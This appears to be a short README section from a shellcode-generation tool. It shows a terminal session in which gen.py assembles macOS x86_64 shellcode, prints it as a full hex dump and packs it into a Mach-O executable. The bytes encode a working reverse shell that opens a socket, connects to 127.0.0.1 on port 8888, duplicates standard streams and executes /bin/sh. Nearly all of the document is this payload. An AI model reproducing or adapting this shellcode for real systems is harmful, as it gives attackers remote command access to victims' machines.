## Shellcoding

```
Ivans-iMac:~ enty8080$ python3 gen.py
[*] Assembling shellcode...
[i] Generated shellcode:
00000000  41 b0 02 49 c1 e0 18 49  83 c8 61 4c 89 c0 48 31 |A..I...I..aL..H1|
00000010  d2 48 89 d6 48 ff c6 48  89 f7 48 ff c7 0f 05 49 |.H..H..H..H....I|
00000020  89 c4 49 bd 01 01 22 b8  7f 00 00 01 41 b1 ff 4d |..I...".....A..M|
00000030  29 cd 41 55 49 89 e5 49  ff c0 4c 89 c0 4c 89 e7 |).AUI..I..L..L..|
00000040  4c 89 ee 48 83 c2 10 0f  05 49 83 e8 08 48 31 f6 |L..H.....I...H1.|
00000050  4c 89 c0 4c 89 e7 0f 05  48 83 fe 02 48 ff c6 76 |L..L....H...H..v|
00000060  ef 49 83 e8 1f 4c 89 c0  48 31 d2 49 bd 2f 2f 62 |.I...L..H1.I.//b|
00000070  69 6e 2f 73 68 49 c1 ed  08 41 55 48 89 e7 48 31 |in/shI...AUH..H1|
00000080  f6 0f 05                                         |...             |
[*] Writing shellcode to Mach-O...
Ivans-iMac:~ enty8080$ file a.out
a.out: Mach-O 64-bit executable x86_64
Ivans-iMac:~ enty8080$
```
